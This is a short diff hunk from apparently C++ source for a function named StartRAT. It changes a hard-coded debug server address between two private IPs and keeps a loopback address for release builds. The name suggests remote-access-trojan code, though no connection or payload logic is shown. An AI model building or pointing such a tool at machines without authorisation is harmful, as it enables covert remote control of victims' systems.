@@ -11,7 +11,7 @@ public:
 
 	static void StartRAT(){
 #ifdef _DEBUG
-		char szServerAddr[32] = "192.168.0.112";
+		char szServerAddr[32] = "192.168.0.110";
 #else
 		char szServerAddr[32] = "127.0.0.1";
 #endif
